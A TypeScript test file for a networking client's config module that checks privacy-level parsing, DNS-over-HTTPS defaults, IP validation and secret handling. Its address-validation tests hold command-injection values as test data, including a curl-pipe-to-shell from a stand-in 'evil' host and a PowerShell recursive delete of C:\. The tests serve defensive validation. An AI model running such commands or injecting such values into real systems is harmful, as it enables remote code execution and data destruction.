import { describe, expect, test } from 'bun:test';
import {
  applyStoredConfig,
  DEFAULT_UPSTREAM_DNS,
  isIpLiteral,
  parsePrivacyLevel,
  resolverSubset,
  systemStateDir,
  type TnpConfig,
} from './config';

describe('parsePrivacyLevel', () => {
  test('accepts the level the client can actually provide', () => {
    const result = parsePrivacyLevel('access');
    expect(result.ok).toBe(true);
    if (result.ok) expect(result.level).toBe('access');
  });

  test('rejects "private" by name, because multi-hop routing is not implemented', () => {
    // The whole point of this function: `--privacy private` used to be accepted,
    // stored, echoed back as `privacy: private`, and then ignored — giving the
    // caller single-hop routing plus a status line claiming otherwise.
    const result = parsePrivacyLevel('private');
    expect(result.ok).toBe(false);
    if (!result.ok) {
      expect(result.error).toContain('private');
      expect(result.error).toContain('not implemented');
    }
  });

  test('distinguishes a planned level from an unknown one', () => {
    const planned = parsePrivacyLevel('private');
    const unknown = parsePrivacyLevel('paranoid');

    expect(planned.ok).toBe(false);
    expect(unknown.ok).toBe(false);
    if (!planned.ok && !unknown.ok) {
      expect(planned.error).not.toBe(unknown.error);
      expect(unknown.error).toContain('unknown');
    }
  });

  test('rejects near-misses rather than coercing them', () => {
    for (const value of ['', 'ACCESS', ' access', 'access ', 'acces', 'undefined']) {
      expect(parsePrivacyLevel(value).ok).toBe(false);
    }
  });

  test('does not inherit a level from Object.prototype', () => {
    // The planned-level lookup is a plain object index; a bare `in`/truthiness
    // check against it would treat "constructor" and "toString" as levels.
    for (const value of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
      const result = parsePrivacyLevel(value);
      expect(result.ok).toBe(false);
      if (!result.ok) expect(result.error).toContain('unknown');
    }
  });
});

describe('applyStoredConfig', () => {
  test('fills defaults for absent keys', () => {
    const config = applyStoredConfig({});
    expect(config.privacyLevel).toBe('access');
    expect(config.listenPort).toBe(5354);
    expect(config.socksPort).toBe(1080);
  });

  test('stored values override defaults', () => {
    const config = applyStoredConfig({ listenPort: 5999, socksPort: 9050 });
    expect(config.listenPort).toBe(5999);
    expect(config.socksPort).toBe(9050);
  });

  test('normalizes a stored "private" back to "access"', () => {
    // A config written by an earlier build can name a level that never worked.
    // Trusting it would put the user back in exactly the state this fixes.
    const stored = { privacyLevel: 'private' } as unknown as Partial<TnpConfig>;
    expect(applyStoredConfig(stored).privacyLevel).toBe('access');
  });

  test('normalizes any unusable stored level, not only the known-planned one', () => {
    for (const value of ['paranoid', '', 'PRIVATE', 42, null]) {
      const stored = { privacyLevel: value } as unknown as Partial<TnpConfig>;
      expect(applyStoredConfig(stored).privacyLevel).toBe('access');
    }
  });

  test('leaves a valid stored level alone', () => {
    expect(applyStoredConfig({ privacyLevel: 'access' }).privacyLevel).toBe('access');
  });
});

describe('upstream DNS default and migration', () => {
  test('the default upstream is DNS-over-HTTPS', () => {
    const config = applyStoredConfig({});
    expect(config.upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
    for (const entry of config.upstreamDns.split(','))
      expect(entry.startsWith('https://')).toBe(true);
  });

  test('the old implicit plaintext default migrates to the encrypted one', () => {
    // Earlier releases wrote `"upstreamDns": "1.1.1.1"` into every saved
    // config, so its presence says nothing about the user's choice.
    expect(applyStoredConfig({ upstreamDns: '1.1.1.1' }).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
    expect(applyStoredConfig({ upstreamDns: ' 1.1.1.1 ' }).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
  });

  test('an explicit choice is respected, including deliberate plaintext', () => {
    for (const choice of [
      '1.1.1.1:53',
      '9.9.9.9',
      'https://dns.example/dns-query',
      '1.1.1.1,8.8.8.8',
    ]) {
      expect(applyStoredConfig({ upstreamDns: choice }).upstreamDns).toBe(choice);
    }
  });

  test('an empty or non-string value falls back to the default', () => {
    expect(applyStoredConfig({ upstreamDns: '' }).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
    const bogus = { upstreamDns: 42 } as unknown as Partial<TnpConfig>;
    expect(applyStoredConfig(bogus).upstreamDns).toBe(DEFAULT_UPSTREAM_DNS);
  });
});

describe('address validation', () => {
  test('isIpLiteral accepts bare IPv4/IPv6 and nothing else', () => {
    for (const ok of ['127.0.0.1', '203.0.113.7', '::1', '2001:db8::53']) {
      expect(isIpLiteral(ok)).toBe(true);
    }
    for (const bad of [
      '',
      'localhost',
      '1.1.1.1; id',
      '$(id)',
      '1.1.1.1/32',
      'fe80::1%eth0',
      '1.1.1',
    ]) {
      expect(isIpLiteral(bad)).toBe(false);
    }
  });

  test('a stored listenAddr that is not an IP falls back to loopback', () => {
    // It is interpolated into resolvectl and firewall commands.
    const stored = { listenAddr: '127.0.0.1 && curl evil | sh' };
    expect(applyStoredConfig(stored).listenAddr).toBe('127.0.0.1');
  });

  test('a stored publicDnsIp that is not an IP is dropped', () => {
    const injected = "1.1.1.1'; Remove-Item C:\\ -Recurse; '";
    expect(applyStoredConfig({ publicDnsIp: injected }).publicDnsIp).toBe('');
    expect(applyStoredConfig({ publicDnsIp: '203.0.113.7' }).publicDnsIp).toBe('203.0.113.7');
  });
});

describe('resolverSubset', () => {
  test('gives the resolver daemon its settings and no secret', () => {
    const full = applyStoredConfig({
      listenAddr: '127.0.0.1',
      listenPort: 53,
      relayAuthToken: 'bearer-secret',
      relayEndpoint: 'wss://relay.example',
    });
    const subset = resolverSubset(full);
    expect(Object.keys(subset).sort()).toEqual(
      ['apiBaseUrl', 'cacheMaxEntries', 'listenAddr', 'listenPort', 'upstreamDns'].sort(),
    );
    expect(JSON.stringify(subset)).not.toContain('bearer-secret');
    expect(subset.listenPort).toBe(53);
  });
});

describe('systemStateDir', () => {
  test('is a root-only system location, never a temporary directory', () => {
    expect(systemStateDir('linux')).toBe('/var/lib/tnp');
    expect(systemStateDir('darwin')).toBe('/Library/Application Support/tnp');
    for (const p of ['linux', 'darwin', 'win32'] as const) {
      expect(systemStateDir(p).toLowerCase()).not.toContain('tmp');
      expect(systemStateDir(p).toLowerCase()).not.toContain('temp');
    }
  });
});
